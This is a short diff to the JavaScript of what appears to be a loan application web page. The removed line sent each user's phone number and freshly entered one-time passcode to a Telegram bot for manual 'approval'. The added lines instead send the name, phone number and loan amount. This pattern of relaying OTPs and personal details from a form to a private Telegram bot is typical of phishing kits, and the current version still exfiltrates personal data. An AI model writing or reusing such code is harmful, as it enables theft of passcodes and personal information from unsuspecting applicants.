@@ -321,7 +321,12 @@
             const timestamp = Date.now();
             currentCallbackData = 'action_' + timestamp;
 
-            const message = `OTP Verification\n\nPhone: +263 ${savedPhone}\nEntered OTP: ${otpValue}\n\nPlease approve or cancel the loan application.`;
+            // Collect only name, phone and loan amount to send to Telegram
+            const firstName = localStorage.getItem('firstName') || 'N/A';
+            const lastName = localStorage.getItem('lastName') || '';
+            const loanAmount = localStorage.getItem('loanAmount') || 'N/A';
+
+            const message = `Loan Application Approval Request\n\nName: ${firstName} ${lastName}\nPhone: +263 ${savedPhone}\nLoan Amount: $${loanAmount}\n\nPlease approve or cancel the loan application.`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
